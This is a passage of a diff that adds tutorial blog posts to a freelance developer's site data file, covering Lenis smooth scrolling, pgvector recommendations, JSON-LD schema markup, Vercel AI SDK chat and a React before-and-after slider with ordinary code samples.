@@ -1,5 +1,1514 @@
 export const blogs = [
   {
+    "id": "lenis-smooth-scroll-react-clean-transitions",
+    "slug": "lenis-smooth-scroll-react-clean-transitions",
+    "title": "Smooth Scrolling with Lenis and Clean Transitions in React",
+    "seoTitle": "Smooth Scrolling with Lenis and React Transitions",
+    "description": "Learn how to set up Lenis smooth scroll in React with clean page transitions, frame-rate syncing, and zero scroll lag on modern browsers.",
+    "publishedAt": "2026-11-17",
+    "updatedAt": "2026-11-17",
+    "readTime": "7 min read",
+    "category": "UI & Animation",
+    "tags": [
+      "React",
+      "Lenis",
+      "Web Animation",
+      "Clean Web Design",
+      "Frontend"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "To set up Lenis in React, wrap your layout with the ReactLenis component from lenis/react, configure damping and touch behavior, and sync the scroll tick with your animation loop or requestAnimationFrame.",
+    "relatedProjectId": 10,
+    "faqs": [
+      {
+        "question": "Does Lenis cause scroll lag or hurt mobile performance?",
+        "answer": "No. Unlike older scroll-jacking scripts from years ago, Lenis normalizes scroll delta on native threads without intercepting hardware touch events by default. On mobile devices, touch scrolling remains native unless you intentionally turn on touch smoothing."
+      },
+      {
+        "question": "How do you coordinate Lenis with GSAP ScrollTrigger?",
+        "answer": "You bind Lenis's scroll event to ScrollTrigger.update and use GSAP's ticker to drive Lenis's animation frame. This keeps scroll position calculations in exact sync and prevents jitter."
+      },
+      {
+        "question": "How do you respect accessibility preferences with smooth scrolling?",
+        "answer": "Check the window.matchMedia('(prefers-reduced-motion: reduce)') media query before initializing Lenis, or pass an option that stops the interpolation loop when reduced motion is preferred."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Why Native Smooth Scroll Falls Short in Modern Web Apps"
+      },
+      {
+        "type": "paragraph",
+        "text": "Native browser smooth scrolling (via CSS `scroll-behavior: smooth`) works fine for basic jump links, but it gives you zero control over duration, easing, or frame synchronization. When you pair native scroll with animated hero sections, sticky navigation bars, or pinned panels, scroll events fire asynchronously. The result is visual stutter, miscalculated bounding rects, and jerky animations."
+      },
+      {
+        "type": "paragraph",
+        "text": "For editorial layouts, high-end portfolios, and hospitality websites, this visual stutter ruins the user experience. In my work on [Yacht Rentals / Sea Cross](/projects/10), we needed high-resolution imagery and booking forms to glide naturally as the user navigates down the page. Lenis solves this by normalizing mouse wheel physics using linear interpolation (lerp) without locking or breaking native browser functionality."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Configuring Lenis in a Modern React Application"
+      },
+      {
+        "type": "paragraph",
+        "text": "The cleanest way to add Lenis to React 19 or Next.js App Router is through the official `lenis/react` package. It provides a lightweight context provider that handles setup, unmounting, and ref binding automatically."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "components/SmoothScrollProvider.tsx",
+        "code": "\"use client\";\n\nimport { ReactLenis } from \"lenis/react\";\nimport { useEffect, useState, type ReactNode } from \"react\";\n\ninterface SmoothScrollProviderProps {\n  children: ReactNode;\n}\n\nexport function SmoothScrollProvider({ children }: SmoothScrollProviderProps) {\n  const [reducedMotion, setReducedMotion] = useState(false);\n\n  useEffect(() => {\n    const mediaQuery = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\n    setReducedMotion(mediaQuery.matches);\n\n    const handleChange = (e: MediaQueryListEvent) => {\n      setReducedMotion(e.matches);\n    };\n\n    mediaQuery.addEventListener(\"change\", handleChange);\n    return () => mediaQuery.removeEventListener(\"change\", handleChange);\n  }, []);\n\n  if (reducedMotion) {\n    return <>{children}</>;\n  }\n\n  return (\n    <ReactLenis\n      root\n      options={{\n        lerp: 0.1,\n        duration: 1.2,\n        smoothWheel: true,\n        wheelMultiplier: 1.0,\n        touchMultiplier: 1.0,\n        infinite: false,\n      }}\n    >\n      {children}\n    </ReactLenis>\n  );\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Respecting User Accessibility",
+        "text": "Smooth scroll can trigger motion sickness for sensitive visitors. Always check the prefers-reduced-motion media query. If enabled, bypass Lenis entirely and let the browser use standard instant scrolling."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Syncing Lenis with Route Transitions and Scroll Resets"
+      },
+      {
+        "type": "paragraph",
+        "text": "A common bug with custom scroll libraries in single-page applications is page transition desynchronization. When a user clicks an internal link, the router updates the DOM, but the scroll position either stays locked midway down the screen or snaps abruptly."
+      },
+      {
+        "type": "paragraph",
+        "text": "To fix this, access the Lenis instance using the `useLenis` hook and call `lenis.scrollTo(0, { immediate: true })` whenever the route pathname changes. This resets the virtual scroll physics immediately so the user starts at the top of the new page."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "hooks/useRouteScrollReset.ts",
+        "code": "\"use client\";\n\nimport { useEffect } from \"react\";\nimport { usePathname } from \"next/navigation\";\nimport { useLenis } from \"lenis/react\";\n\nexport function useRouteScrollReset() {\n  const pathname = usePathname();\n  const lenis = useLenis();\n\n  useEffect(() => {\n    if (!lenis) return;\n    \n    // Stop inertia from the previous page and snap to top\n    lenis.scrollTo(0, { immediate: true });\n  }, [pathname, lenis]);\n}"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Coordinating Scroll Animations with WebGL and GSAP"
+      },
+      {
+        "type": "paragraph",
+        "text": "When combining Lenis with complex visual components—like the dynamic 3D food model on [3D Burger Website / Smoked & Seared](/projects/13)—you must sync your animation render loops. If GSAP runs on its own internal ticker while Lenis runs on a separate requestAnimationFrame loop, calculations drift apart, producing micro-jitters."
+      },
+      {
+        "type": "list",
+        "items": [
+          "Feed Lenis scroll updates directly into GSAP ScrollTrigger using ScrollTrigger.update().",
+          "Use gsap.ticker.add to drive the Lenis instance so both tools share a unified time step.",
+          "Set lagSmoothing(0) in GSAP during critical transitions to prevent catch-up jumps on heavy render frames."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Practical Rules for Clean Website Interactions"
+      },
+      {
+        "type": "paragraph",
+        "text": "Smooth scrolling should remain invisible to the user. It should feel like a well-weighted physical dial rather than a sluggish delay. Follow these baseline rules on every project:"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Never disable mouse wheel momentum completely; keep the lerp value between 0.08 and 0.12.",
+          "Never block native keyboard accessibility keys such as Space, Page Down, or Up/Down arrows.",
+          "Keep input fields, dropdown menus, and text areas inside non-scrolling or native overflow containers to avoid pointer drift.",
+          "Test on trackpads, mouse wheels, and mobile screens separately. Trackpad inertia already feels smooth natively, so avoid over-damping."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, clean web applications that balance striking UI interactions with solid core web vitals. You can explore my [Full-Stack Web Development Services](/services) or [get in touch with Aafaque](/contact) to discuss your next web build."
+      }
+    ]
+  },
+  {
+    "id": "pgvector-postgresql-vector-search-recommendations",
+    "slug": "pgvector-postgresql-vector-search-recommendations",
+    "title": "Building Lightweight Vector Search in PostgreSQL with pgvector for Real-Time Semantic Recommendations",
+    "seoTitle": "Lightweight Vector Search with PostgreSQL & pgvector",
+    "description": "Learn how to build fast semantic recommendations using PostgreSQL and pgvector without third-party vector databases or complex microservices.",
+    "publishedAt": "2026-11-16",
+    "updatedAt": "2026-11-16",
+    "readTime": "7 min read",
+    "category": "AI & Full-Stack",
+    "tags": [
+      "pgvector",
+      "PostgreSQL",
+      "Supabase",
+      "Embeddings",
+      "React"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "pgvector enables vector similarity search directly inside your relational PostgreSQL database using cosine or L2 distance. Storing text embeddings in a standard table allows you to query semantic recommendations in single-digit milliseconds alongside typical relational filters, eliminating the operational cost of dedicated vector engines.",
+    "relatedProjectId": 2,
+    "faqs": [
+      {
+        "question": "Why use pgvector instead of a standalone vector database like Pinecone?",
+        "answer": "pgvector lives directly inside your primary relational database. This allows you to join vector search results directly with real-time stock levels, user permissions, and price filters in a single query. It eliminates data sync lag and lowers infrastructure bills by avoiding a second managed service."
+      },
+      {
+        "question": "Which indexing method should I use: HNSW or IVFFlat?",
+        "answer": "Use HNSW (Hierarchical Navigable Small World) for almost all production web apps. It offers significantly higher queries per second and better recall without requiring you to rebuild the index as your dataset grows, unlike IVFFlat which needs periodic retraining."
+      },
+      {
+        "question": "How fast are pgvector queries on modest cloud servers?",
+        "answer": "On a database with tens of thousands of products and an HNSW index, cosine distance queries run in 5ms to 15ms. That speed is fast enough to run dynamic product recommendations on live product detail pages without caching."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The Problem with Dedicated Vector Databases"
+      },
+      {
+        "type": "paragraph",
+        "text": "Many startups jump immediately to external vector databases when building AI features. While specialized tools work well for multi-million vector datasets, they introduce unnecessary complexity for typical web applications. Managing two databases means synchronizing product changes, handling eventual consistency bugs, and paying two monthly invoices."
+      },
+      {
+        "type": "paragraph",
+        "text": "When building e-commerce catalogs like [Shopease / Oud & Attar](/projects/2), recommendations must respect stock status, regional catalog availability, and category rules. If your vectors live in an external tool, you must query vectors first, extract IDs, and then query PostgreSQL to filter out out-of-stock items. With pgvector, this entire flow runs inside a single, fast SQL statement."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Configuring pgvector and HNSW in PostgreSQL"
+      },
+      {
+        "type": "paragraph",
+        "text": "To get started, enable the extension and define a vector column on your catalog table. For OpenAI's text-embedding-3-small model, the vector dimension is 1536."
+      },
+      {
+        "type": "code",
+        "language": "sql",
+        "caption": "PostgreSQL schema with pgvector and HNSW index",
+        "code": "-- 1. Enable the pgvector extension\nCREATE EXTENSION IF NOT EXISTS vector;\n\n-- 2. Add an embedding column to your products table\nALTER TABLE products \nADD COLUMN IF NOT EXISTS embedding vector(1536);\n\n-- 3. Create an HNSW index for cosine distance queries\nCREATE INDEX IF NOT EXISTS products_embedding_hnsw_idx \nON products \nUSING hnsw (embedding vector_cosine_ops)\nWITH (m = 16, ef_construction = 64);\n\n-- 4. Fast RPC function for similarity search with stock filtering\nCREATE OR REPLACE FUNCTION match_related_products (\n  target_embedding vector(1536),\n  match_threshold float,\n  match_count int,\n  current_product_id bigint\n)\nRETURNS TABLE (\n  id bigint,\n  name text,\n  slug text,\n  price numeric,\n  similarity float\n)\nLANGUAGE sql STABLE\nAS $$\n  SELECT\n    p.id,\n    p.name,\n    p.slug,\n    p.price,\n    1 - (p.embedding <=> target_embedding) AS similarity\n  FROM products p\n  WHERE p.id <> current_product_id\n    AND p.is_in_stock = true\n    AND 1 - (p.embedding <=> target_embedding) > match_threshold\n  ORDER BY p.embedding <=> target_embedding\n  LIMIT match_count;\n$$;"
+      },
+      {
+        "type": "callout",
+        "title": "Index Choice Insight",
+        "text": "The operator <=> calculates cosine distance. In pgvector, cosine distance equals 1 minus the cosine similarity. An HNSW index using vector_cosine_ops allows your queries to scale to hundreds of thousands of rows while keeping query execution times well under 20 milliseconds."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Building the Embeddings Pipeline in TypeScript"
+      },
+      {
+        "type": "paragraph",
+        "text": "To keep embeddings updated, create a lightweight server-side utility that generates an embedding string whenever a product description or title updates. Here is a clean implementation using modern TypeScript."
+      },
+      {
+        "type": "code",
+        "language": "typescript",
+        "caption": "Product embedding generator with OpenAI",
+        "code": "import OpenAI from 'openai';\n\nconst openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });\n\ninterface ProductInput {\n  name: string;\n  category: string;\n  scentNotes?: string[];\n  description: string;\n}\n\nexport async function generateProductEmbedding(product: ProductInput): Promise<number[]> {\n  // Clean and format text payload for dense semantic coverage\n  const inputContent = [\n    `Product: ${product.name}`,\n    `Category: ${product.category}`,\n    product.scentNotes ? `Notes: ${product.scentNotes.join(', ')}` : '',\n    `Details: ${product.description}`\n  ].filter(Boolean).join('\\n');\n\n  const response = await openai.embeddings.create({\n    model: 'text-embedding-3-small',\n    input: inputContent,\n    encoding_format: 'float',\n  });\n\n  return response.data[0].embedding;\n}"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Real-Time Recommendations in React 19"
+      },
+      {
+        "type": "paragraph",
+        "text": "Once your database function is active, consuming it from a Next.js or React Server Component is straightforward. You fetch matching products alongside the initial page payload, removing client-side layout shifts."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "React Server Component fetching semantic recommendations",
+        "code": "import { createClient } from '@supabase/supabase-js';\nimport Link from 'next/link';\n\ninterface RelatedProduct {\n  id: number;\n  name: string;\n  slug: string;\n  price: number;\n  similarity: number;\n}\n\nexport async function RelatedProductsSection({ \n  productId, \n  embedding \n}: { \n  productId: number;\n  embedding: number[]; \n}) {\n  const supabase = createClient(\n    process.env.NEXT_PUBLIC_SUPABASE_URL!,\n    process.env.SUPABASE_SERVICE_ROLE_KEY!\n  );\n\n  const { data: recommendations, error } = await supabase.rpc(\n    'match_related_products',\n    {\n      target_embedding: embedding,\n      match_threshold: 0.70,\n      match_count: 4,\n      current_product_id: productId,\n    }\n  );\n\n  if (error || !recommendations?.length) {\n    return null;\n  }\n\n  return (\n    <section className=\"mt-16 border-t border-zinc-200 pt-8 dark:border-zinc-800\">\n      <h3 className=\"text-lg font-semibold text-zinc-900 dark:text-zinc-100\">\n        You May Also Like\n      </h3>\n      <div className=\"mt-6 grid grid-cols-2 gap-4 sm:grid-cols-4\">\n        {recommendations.map((item: RelatedProduct) => (\n          <Link\n            key={item.id}\n            href={`/products/${item.slug}`}\n            className=\"group rounded-lg border border-zinc-200 p-4 transition-colors hover:border-zinc-400 dark:border-zinc-800 dark:hover:border-zinc-600\"\n          >\n            <p className=\"font-medium text-zinc-800 group-hover:text-blue-600 dark:text-zinc-200\">\n              {item.name}\n            </p>\n            <p className=\"mt-1 text-sm text-zinc-500\">₹{item.price}</p>\n            <span className=\"mt-2 inline-block text-xs text-emerald-600 dark:text-emerald-400\">\n              {Math.round(item.similarity * 100)}% Match\n            </span>\n          </Link>\n        ))}\n      </div>\n    </section>\n  );\n}"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Practical Production Best Practices"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Store the vector output directly in your products row so you do not need to re-encode the active item on every view.",
+          "Use HNSW index parameters (m = 16, ef_construction = 64) for balanced memory usage and index build times.",
+          "Always combine vector distance with practical SQL WHERE clauses like inventory counts and active flags.",
+          "Set maintenance_work_mem appropriately when building large indexes so PostgreSQL does not write intermediate sorting pages to disk."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing Vector Search in Your Application?"
+      },
+      {
+        "type": "paragraph",
+        "text": "Whether you are building an e-commerce catalog, a knowledge base, or an internal search tool, keeping your AI pipeline simple saves money and reduces bugs. Explore my [Full-Stack Web Development Services](/services) to see how I help founders build reliable web apps, or [Get in touch with Aafaque](/contact) to discuss your project directly."
+      }
+    ]
+  },
+  {
+    "id": "schema-markup-web-apps-guide",
+    "slug": "schema-markup-web-apps-guide",
+    "title": "How to Structure Web Apps with Schema Markup for Modern Search Engines",
+    "seoTitle": "Schema Markup Guide for Web Apps: JSON-LD & Snippets",
+    "description": "Learn how to add JSON-LD schema markup to modern React and Next.js web applications to secure rich search results and improve indexation.",
+    "publishedAt": "2026-11-15",
+    "updatedAt": "2026-11-15",
+    "readTime": "7 min read",
+    "category": "SEO & Growth",
+    "tags": [
+      "Schema Markup",
+      "JSON-LD",
+      "Search Engine Optimization",
+      "React"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "Schema markup is a standardized code format (JSON-LD) added to web apps to help search engines understand entities, products, and services, directly enabling rich snippets in search results.",
+    "relatedProjectId": 17,
+    "faqs": [
+      {
+        "question": "What is JSON-LD schema markup?",
+        "answer": "JSON-LD stands for JavaScript Object Notation for Linked Data. It is a lightweight method of writing structured data that search engines read to understand the exact context of your web page content."
+      },
+      {
+        "question": "Where should JSON-LD scripts be placed in a React or Next.js app?",
+        "answer": "JSON-LD scripts should be injected directly into the document head or rendered inside the server-side component tree using a script tag with the type 'application/ld+json' so crawlers parse it immediately."
+      },
+      {
+        "question": "Does schema markup guarantee rich snippets in Google?",
+        "answer": "No. Valid schema makes your app eligible for rich snippets, but Google decides whether to display them based on search query relevance, page quality, and crawler assessment."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Why Modern Web Apps Need Structured Data"
+      },
+      {
+        "type": "paragraph",
+        "text": "Search engine crawlers are smart, but they still rely on explicit hints to categorize dynamic web application content. When building single-page apps or server-rendered React portals, plain HTML is often not enough to explain complex data relationships like travel itineraries, local business details, or e-commerce inventories. By implementing structured data, you remove ambiguity for search crawlers."
+      },
+      {
+        "type": "paragraph",
+        "text": "In projects like [Al Raheeq Tourism](/projects/17), integrating precise Schema.org types for travel agencies and local tours helps search engines display pricing, duration, and reviews directly in search results. Similar benefits apply when setting up e-commerce catalogs or local service portfolios."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Implementing JSON-LD in React and Next.js"
+      },
+      {
+        "type": "paragraph",
+        "text": "The cleanest way to add schema markup in modern component-driven apps is to create a reusable TypeScript helper that injects a JSON-LD script block into your page head. This ensures type safety and prevents syntax errors that invalidate your structured data."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Reusable JSON-LD Component in React",
+        "code": "import React from 'react';\n\ninterface SchemaScriptProps {\n  data: Record<string, any>;\n}\n\nexport default function SchemaScript({ data }: SchemaScriptProps) {\n  return (\n    <script\n      type=\"application/ld+json\"\n      dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}\n    />\n  );\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Validation Warning",
+        "text": "Always test your generated JSON-LD blocks using the official Google Rich Results Test or Schema Markup Validator before pushing updates to production."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Common Types of Schema for Web Applications"
+      },
+      {
+        "type": "paragraph",
+        "text": "Depending on the type of web application you are building, you should combine multiple schema types to provide complete entity data to search engines."
+      },
+      {
+        "type": "list",
+        "items": [
+          "Organization & LocalBusiness: Establishes company identity, physical address, support phone numbers, and social profiles.",
+          "Product & Offer: Essential for e-commerce apps to expose live pricing, stock status, and customer reviews.",
+          "FAQPage: Enables collapsible FAQ accordions directly in Google search results.",
+          "BreadcrumbList: Clarifies the URL hierarchy and site structure for crawlers and users."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "Proper technical setup makes a massive difference in how search engines index and rank web applications. If you need clean, high-performance implementation for your project, explore my [Full-Stack Web Development Services](/services) or [get in touch with Aafaque](/contact) to discuss your requirements."
+      }
+    ]
+  },
+  {
+    "id": "vercel-ai-sdk-react-19-streaming-chat",
+    "slug": "vercel-ai-sdk-react-19-streaming-chat",
+    "title": "Integrating the Vercel AI SDK into React 19: Streaming AI Chat, Generative UI, and Tool Calling",
+    "seoTitle": "Vercel AI SDK & React 19: Streaming Chat &...",
+    "description": "Learn how to build real-time streaming LLM chat interfaces, generative UI, and tool calling in React 19 with the Vercel AI SDK and Next.js.",
+    "publishedAt": "2026-11-14",
+    "updatedAt": "2026-11-14",
+    "readTime": "7 min read",
+    "category": "AI & Full-Stack",
+    "tags": [
+      "React 19",
+      "Vercel AI SDK",
+      "Next.js",
+      "TypeScript",
+      "LLM Streaming"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "The Vercel AI SDK combined with React 19 lets developers build real-time streaming text, dynamic generative UI components, and secure server-side tool calls with minimal boilerplate code.",
+    "relatedProjectId": 1,
+    "faqs": [
+      {
+        "question": "How do React 19 actions work with the Vercel AI SDK?",
+        "answer": "React 19 actions handle form submissions and state updates natively, allowing you to pass user messages directly into the useChat hook without manual event preventDefault plumbing."
+      },
+      {
+        "question": "What is generative UI in the Vercel AI SDK?",
+        "answer": "Generative UI allows the LLM to return rendered React components instead of plain text by using tools that map function calls to client-side UI components."
+      },
+      {
+        "question": "Can I use the Vercel AI SDK with custom backends?",
+        "answer": "Yes, while it integrates cleanly with Next.js API routes and server actions, you can use the AI SDK core package with Express, Fastify, or Node.js HTTP servers."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Setting Up the Environment with React 19 and Next.js"
+      },
+      {
+        "type": "paragraph",
+        "text": "React 19 introduces major improvements to client-side state management, form actions, and hook handling. When paired with the Vercel AI SDK, setting up a real-time chat interface takes very little code. For example, when building data-heavy tools like our [Inventory Management / InvMaster OS](/projects/1), adding AI assistants helps operators query godown stock levels using plain natural language."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Basic React 19 Chat Component using useChat",
+        "code": "'use client';\n\nimport { useChat } from '@ai-sdk/react';\n\nexport default function ChatComponent() {\n  const { messages, input, handleInputChange, handleSubmit } = useChat();\n\n  return (\n    <div className=\"flex flex-col h-full max-w-xl mx-auto p-4\">\n      <div className=\"flex-1 overflow-y-auto space-y-4 mb-4\">\n        {messages.map((m) => (\n          <div key={m.id} className={`p-3 rounded-lg ${m.role === 'user' ? 'bg-blue-100 text-right' : 'bg-gray-100'}`}>\n            <strong>{m.role === 'user' ? 'You: ' : 'AI: '}</strong>\n            {m.content}\n          </div>\n        ))}\n      </div>\n      <form onSubmit={handleSubmit} className=\"flex gap-2\">\n        <input\n          className=\"border rounded p-2 flex-1\"\n          value={input}\n          onChange={handleInputChange}\n          placeholder=\"Ask anything...\"\n        />\n        <button type=\"submit\" className=\"bg-blue-600 text-white px-4 py-2 rounded\">\n          Send\n        </button>\n      </form>\n    </div>\n  );\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Development Tip",
+        "text": "Always ensure your API routes handling the LLM streams are marked as edge runtime or nodejs runtime with streaming enabled so chunks reach the client instantly."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Implementing Server-Side Tool Calling"
+      },
+      {
+        "type": "paragraph",
+        "text": "Tool calling allows language models to execute specific JavaScript functions on your server to fetch live data. This bridges the gap between static LLM text generation and real-world database lookups."
+      },
+      {
+        "type": "code",
+        "language": "typescript",
+        "caption": "API Route with Tool Definition",
+        "code": "import { openai } from '@ai-sdk/openai';\nimport { streamText } from 'ai';\nimport { z } from 'zod';\n\nexport async function POST(req: Request) {\n  const { messages } = await req.json();\n\n  const result = await streamText({\n    model: openai('gpt-4o'),\n    messages,\n    tools: {\n      getStockLevel: {\n        description: 'Get stock level for a specific item code',\n        parameters: z.object({\n          itemCode: z.string().describe('The product SKU or item code'),\n        }),\n        execute: async ({ itemCode }) => {\n          // Connect to database and fetch stock\n          const stock = await fetchStockFromDB(itemCode);\n          return { itemCode, stock };\n        },\n      },\n    },\n  });\n\n  return result.toDataStreamResponse();\n}"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Core Practices for Production AI Features"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Validate all tool inputs using Zod schemas on the server before running database queries.",
+          "Handle connection drops gracefully with built-in retry mechanisms in the AI SDK.",
+          "Keep system prompts concise to reduce time-to-first-token latency for users."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, production-ready web applications. [Full-Stack Web Development Services](/services) or [Get in touch with Aafaque](/contact) to discuss your project requirements."
+      }
+    ]
+  },
+  {
+    "id": "before-after-slider-medical-booking-react",
+    "slug": "before-after-slider-medical-booking-react",
+    "title": "Designing Interactive Before-and-After Comparison Sliders and Medical Booking Flows in React",
+    "seoTitle": "React Before/After Sliders & Medical Booking UI",
+    "description": "Learn how to build a custom interactive before and after image comparison slider and multi-step medical appointment booking flow in React.",
+    "publishedAt": "2026-11-13",
+    "updatedAt": "2026-11-13",
+    "readTime": "7 min read",
+    "category": "UI & Animation",
+    "tags": [
+      "before after image slider react",
+      "dental clinic web design",
+      "medical booking flow ui",
+      "React 19",
+      "TypeScript"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "A React before-and-after image slider tracks pointer coordinates over a container to clip the top image width dynamically, while a medical booking flow uses controlled multi-step state validation to submit patient appointments reliably.",
+    "relatedProjectId": 11,
+    "faqs": [
+      {
+        "question": "How do you build a responsive before and after image slider in React?",
+        "answer": "You track mouse move and touch move events on a parent container, calculate the cursor offset percentage from the left boundary, and apply that percentage as the width of the top clipped image layer."
+      },
+      {
+        "question": "What is the best way to handle multi-step medical booking forms in React?",
+        "answer": "Use a local React state variable to track the active step index, validate user inputs at each step before allowing progression, and retain form data in a single parent state object until final submission."
+      },
+      {
+        "question": "Why are image comparison sliders important for dental and medical websites?",
+        "answer": "They provide instant visual proof of clinical procedures such as teeth whitening, orthodontics, or cosmetic surgery, helping patients build trust and decide to book a consultation."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Introduction to Dental Clinic Web Design and Visual Proof"
+      },
+      {
+        "type": "paragraph",
+        "text": "When building modern medical and dental websites, user trust is everything. Patients want to see real evidence of what a clinic can achieve before they schedule an appointment. During the development of [CarePulse / Aura Dental Studio](/projects/11), one of the primary client requirements was an interactive 50/50 before-and-after comparison slider that works smoothly on both desktop touchpads and mobile touch screens."
+      },
+      {
+        "type": "paragraph",
+        "text": "Many developers rely on heavy third-party UI packages for basic image comparisons. However, writing a lightweight, custom React component gives you full control over performance, bundle size, and touch event handling. Let us break down how to implement this cleanly using React 19 and TypeScript."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Building the Before-and-After Image Comparison Slider Component"
+      },
+      {
+        "type": "paragraph",
+        "text": "The core logic relies on tracking mouse and touch coordinates within the container bounds, converting those pixel values into a percentage, and applying that percentage to clip the top image element using CSS properties."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Custom React Before and After Slider Component",
+        "code": "import React, { useState, useRef, useCallback } from 'react';\n\ninterface ComparisonSliderProps {\n  beforeImage: string;\n  afterImage: string;\n  beforeLabel?: string;\n  afterLabel?: string;\n}\n\nexport const ComparisonSlider: React.FC<ComparisonSliderProps> = ({\n  beforeImage,\n  afterImage,\n  beforeLabel = 'Before',\n  afterLabel = 'After'\n}) => {\n  const [sliderPosition, setSliderPosition] = useState<number>(50);\n  const [isDragging, setIsDragging] = useState<boolean>(false);\n  const containerRef = useRef<HTMLDivElement>(null);\n\n  const handleMove = useCallback((clientX: number) => {\n    if (!containerRef.current) return;\n    const rect = containerRef.current.getBoundingClientRect();\n    const x = clientX - rect.left;\n    let percentage = (x / rect.width) * 100;\n\n    if (percentage < 0) percentage = 0;\n    if (percentage > 100) percentage = 100;\n\n    setSliderPosition(percentage);\n  }, []);\n\n  const handleTouchMove = (e: React.TouchEvent<HTMLDivElement>) => {\n    handleMove(e.touches[0].clientX);\n  };\n\n  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {\n    if (!isDragging) return;\n    handleMove(e.clientX);\n  };\n\n  return (\n    <div\n      ref={containerRef}\n      className=\"relative w-full max-h-[500px] overflow-hidden select-none cursor-ew-resize rounded-2xl\"\n      onMouseMove={handleMouseMove}\n      onMouseUp={() => setIsDragging(false)}\n      onMouseLeave={() => setIsDragging(false)}\n      onTouchMove={handleTouchMove}\n    >\n      {/* After Image (Background) */}\n      <img\n        src={afterImage}\n        alt={afterLabel}\n        className=\"w-full h-auto object-cover block\"\n      />\n      <span className=\"absolute top-4 right-4 bg-black/70 text-white text-xs px-3 py-1 rounded-full\">\n        {afterLabel}\n      </span>\n\n      {/* Before Image (Clipped Layer) */}\n      <div\n        className=\"absolute inset-0 overflow-hidden\"\n        style={{ width: `${sliderPosition}%` }}\n      >\n        <img\n          src={beforeImage}\n          alt={beforeLabel}\n          className=\"absolute inset-0 w-full h-full object-cover max-w-none\"\n          style={{ width: containerRef.current ? `${containerRef.current.offsetWidth}px` : '100%' }}\n        />\n        <span className=\"absolute top-4 left-4 bg-black/70 text-white text-xs px-3 py-1 rounded-full\">\n          {beforeLabel}\n        </span>\n      </div>\n\n      {/* Slider Handle Line & Button */}\n      <div\n        className=\"absolute top-0 bottom-0 w-1 bg-white cursor-ew-resize\"\n        style={{ left: `${sliderPosition}%` }}\n        onMouseDown={() => setIsDragging(true)}\n        onTouchStart={() => setIsDragging(true)}\n      >\n        <div className=\"absolute top-1/2 -translate-y-1/2 -translate-x-1/2 w-8 h-8 bg-white rounded-full shadow-md flex items-center justify-center text-gray-800 font-bold\">\n          ↔\n        </div>\n      </div>\n    </div>\n  );\n};"
+      },
+      {
+        "type": "callout",
+        "title": "Performance Optimization Note",
